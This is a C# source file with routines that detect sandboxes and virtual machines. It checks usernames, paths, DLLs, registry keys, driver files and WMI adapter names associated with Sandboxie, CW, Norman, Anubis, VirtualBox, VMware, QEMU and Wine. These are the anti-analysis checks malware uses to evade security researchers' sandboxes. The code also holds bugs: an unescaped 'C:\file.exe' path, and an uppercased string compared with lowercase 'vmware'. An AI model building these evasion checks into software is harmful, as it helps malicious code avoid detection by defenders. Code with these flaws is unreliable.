 public class Detection
        {
            [DllImport("advapi32.dll", SetLastError = true)]
            public static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);
            
            [DllImport("kernel32.dll")]
            public static extern IntPtr GetModuleHandle(string lpModuleName);

            [DllImport("user32.dll", SetLastError = true)]
            static extern IntPtr FindWindow(string lpClassName, IntPtr ZeroOnly);

            [DllImport("kernel32.dll")]
            extern public static IntPtr GetProcAddress(IntPtr hModule, string procedureName);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            public static extern uint GetFileAttributes(string lpFileName);


            public static bool IsSandbox(string startupPath)
            {

                StringBuilder username = new StringBuilder();
                Int32 nSize = 50;
                GetUserName(username, ref nSize);

                // Detected sandboxie
                if ((int)GetModuleHandle("SbieDll.dll") != 0) { return true; }

                // unknown sandbox
                if (username.ToString().ToUpper() == "USER".ToUpper()) { return true; }
                // unknown sandbox
                if (username.ToString().ToUpper() == "SANDBOX".ToUpper()) { return true; }
                // unknown sandbox
                if (username.ToString().ToUpper() == "VIRUS".ToUpper()) { return true; }
                // unknown sandbox
                if (username.ToString().ToUpper() == "MALWARE".ToUpper()) { return true; }

                // Detected CW Sandbox.
                if (username.ToString().ToUpper() == "Schmidti".ToUpper()) { return true; }
                
                // Detected Norman Sandbox. 
                if (username.ToString().ToUpper() == "currentuser".ToUpper()) { return true; }

                // unknown sandbox
                if (startupPath.ToUpper().Contains("\\VIRUS".ToUpper())) { return true; }

                // unknown sandbox
                if (startupPath.ToUpper().Contains("SANDBOX".ToUpper())) { return true; }


                // Detected Anubis sandbox. any body can call there user andy :s
                if (startupPath.ToUpper().Contains("sample".ToUpper()) ){ return true; }
                // this one will false detect pc with name andy // if(username.ToString().ToUpper() == "andy".ToUpper()) { return true; }
               
                // Detected Sunbelt sandbox.
                if(startupPath == "C:\file.exe"){ return true; }
                
                // Detected WinJail Sandbox.
                if((int)FindWindow("Afx:400000:0", (IntPtr)0) != 0){ return true; }

                return false;

            }



            public static string regGet(string key, string value)
            {
                RegistryKey registryKey;
                registryKey = Registry.LocalMachine.OpenSubKey(key,false);
                if (registryKey != null)
                {
                    object rkey = registryKey.GetValue(value, (object)(string)"noValueButYesKey");
                    if (rkey.GetType() == typeof(string))
                    {
                        return rkey.ToString();
                    }
                    if (registryKey.GetValueKind(value) == RegistryValueKind.String || registryKey.GetValueKind(value) == RegistryValueKind.ExpandString)
                    {
                        return rkey.ToString();
                    }
                    if (registryKey.GetValueKind(value) == RegistryValueKind.DWord)
                    {
                        return Convert.ToString((Int32)rkey);
                    }
                    if (registryKey.GetValueKind(value) == RegistryValueKind.QWord)
                    {
                        return Convert.ToString((Int64)rkey);
                    }
                    if (registryKey.GetValueKind(value) == RegistryValueKind.Binary)
                    {
                        return Convert.ToString((byte[])rkey);
                    }
                    if (registryKey.GetValueKind(value) == RegistryValueKind.MultiString)
                    {
                        return string.Join("", (string[])rkey);
                    }
                    return "noValueButYesKey";
                }

                return "noKey";
            }

            public static bool IsVM()
            {

                // Detected vbox
                if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("vbox".ToUpper())) { return true; }
                if (regGet("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("vbox".ToUpper())) { return true; }
                if (regGet("HARDWARE\\Description\\System", "VideoBiosVersion").ToUpper().Contains("VIRTUALBOX".ToUpper())) { return true; }
                if (regGet("SOFTWARE\\Oracle\\VirtualBox Guest Additions", "") == "noValueButYesKey") { return true; }
                if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\VBoxMouse.sys") != (uint)4294967295) { return true; }

                // Detected vmware
                if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("vmware".ToUpper())) { return true; }
                if (regGet("SOFTWARE\\VMware, Inc.\\VMware Tools", "") == "noValueButYesKey") { return true; }
                if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 1\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("vmware".ToUpper())) { return true; }
                if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 2\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("vmware".ToUpper())) { return true; }
                if (regGet("SYSTEM\\ControlSet001\\Services\\Disk\\Enum", "0").ToUpper().Contains("vmware".ToUpper())) { return true; }
                if (regGet("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000", "DriverDesc").ToUpper().Contains("vmware".ToUpper())) { return true; }
                if (regGet("SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\Settings", "Device Description").ToUpper().Contains("vmware".ToUpper())) { return true; }
                if (regGet("SOFTWARE\\VMware, Inc.\\VMware Tools", "InstallPath").ToUpper().Contains("C:\\Program Files\\VMware\\VMware Tools\\".ToUpper())) { return true; }
               if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys") != (uint)4294967295) { return true; }
                if (GetFileAttributes("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys") != (uint)4294967295) { return true; }

                // Detected whine
                if (GetProcAddress((IntPtr)GetModuleHandle("kernel32.dll"), "wine_get_unix_file_name") != (IntPtr)0) { return true;  }

                // Detected QEMU
                if (regGet("HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", "Identifier").ToUpper().Contains("qemu".ToUpper())) { return true; }
                if (regGet("HARDWARE\\Description\\System", "SystemBiosVersion").ToUpper().Contains("qemu".ToUpper())) { return true; }

                // some extra
                ManagementScope scope = new ManagementScope("\\\\.\\ROOT\\cimv2");
                ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_VideoController");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection queryCollection = searcher.Get();
                foreach (ManagementObject m in queryCollection)
                {
                    //Detected MS VPC with Additions
                    if (m["Description"].ToString() == "VM Additions S3 Trio32/64") { return true; }
                    //Detected MS VPC without Additions
                    if (m["Description"].ToString() == "S3 Trio32/64") { return true; }
                    //Detected VirtualBox with Additions
                    if (m["Description"].ToString() == "VirtualBox Graphics Adapter") { return true; }
                    //Detected VMWare with Additions
                    if (m["Description"].ToString() == "VMware SVGA II") {return true; }
                    //Detected VMWare
                    if (m["Description"].ToString().ToUpper().Contains("vmware")) {return true; }
                    //Detected a VM
                    if (m["Description"].ToString() == "") {  return true; }
                }

                return false;
            }
        
        }
